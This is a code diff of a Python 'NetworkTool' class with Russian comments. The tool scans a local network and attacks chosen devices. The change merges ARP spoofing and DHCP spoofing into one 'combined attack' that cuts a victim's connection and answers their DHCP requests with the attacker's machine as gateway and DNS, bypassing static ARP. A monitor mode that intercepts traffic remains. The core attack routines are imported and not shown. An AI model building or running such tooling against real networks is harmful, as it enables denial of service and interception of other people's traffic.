@@ -3,10 +3,9 @@ NetworkTool — главный класс, собирающий все моду�
 
 Публичный API:
 - update_devices() — ARP-сканирование сети
-- attack(ip, mac) — ARP-spoof (обрыв связи)
-- start_monitor(ip, mac) — ARP-spoof + перехват
-- start_dhcp_spoof(ip, mac) — DHCP-spoof (обход статического ARP)
-- stop() — остановка всего
+- attack(ip, mac) — комбинированная атака (ARP-spoof + DHCP-spoof)
+- start_monitor(ip, mac) — ARP-spoof + перехват трафика
+- stop() — остановка всего и восстановление сети
 - find_noisy_guy() — поиск самого активного устройства
 """
 
@@ -31,9 +30,8 @@ from scapy.sendrecv import srp, sniff
 from core.vendor import VendorResolver
 from core.forwarding import toggle_forwarding
 from core.attack import (
-    start_attack_process,
+    start_combined_attack,
     start_monitor_process,
-    start_dhcp_process,
     stop_dhcp_spoof,
 )
 
@@ -45,9 +43,8 @@ class NetworkTool:
     Usage:
         tool = NetworkTool()
         tool.update_devices()
-        tool.attack(ip, mac)
+        tool.attack(ip, mac)       # комбинированная: ARP + DHCP
         tool.start_monitor(ip, mac)
-        tool.start_dhcp_spoof(ip, mac)
         tool.stop()
     """
 
@@ -212,7 +209,13 @@ class NetworkTool:
     # ------------------------------------------------------------------
 
     def attack(self, ip: str, mac: str) -> None:
-        """Запустить ARP-spoof атаку (без мониторинга)."""
+        """
+        Запустить комбинированную атаку: ARP-spoof + DHCP-spoof.
+
+        ARP-spoof работает постоянно (обрыв связи).
+        DHCP-сниффер ждёт в фоне — если жертва запросит IP,
+        мы ответим быстрее роутера (обход статического ARP).
+        """
         self.is_attacking = False
         time.sleep(0.2)
         self.target_info.update({
@@ -223,7 +226,7 @@ class NetworkTool:
         self.is_attacking = True
 
         Thread(
-            target=start_attack_process,
+            target=start_combined_attack,
             args=(
                 lambda: self.is_attacking,
                 self.target_info,
@@ -253,37 +256,6 @@ class NetworkTool:
                 self.target_info,
                 self.found_devices,
                 self.query_log,
-                self.router_ip, self.router_mac,
-                self.my_ip, self.my_mac,
-                self.on_attack_log, self.on_monitor_log,
-            ),
-            daemon=True,
-        ).start()
-
-    # ------------------------------------------------------------------
-    def start_dhcp_spoof(self, ip: str, mac: str) -> None:
-        """Запустить DHCP-spoof (обход статического ARP)."""
-        self.is_attacking = False
-        time.sleep(0.2)
-        self.target_info.update({
-            "ip": ip, "mac": mac, "name": "", "packets": 0,
-            "os": None, "model": None,
-        })
-        self.query_log.clear()
-        self.is_attacking = True
-
-        self._log_attack(
-            f"[*] DHCP SPOOF: Запущен DHCP-сервер для {ip}"
-        )
-        self._log_attack(
-            f"    Буду выдавать Gateway={self.my_ip}, DNS={self.my_ip}"
-        )
-
-        Thread(
-            target=start_dhcp_process,
-            args=(
-                lambda: self.is_attacking,
-                self.target_info,
                 self.router_ip, self.router_mac,
                 self.my_ip, self.my_mac,
                 self.on_attack_log, self.on_monitor_log,
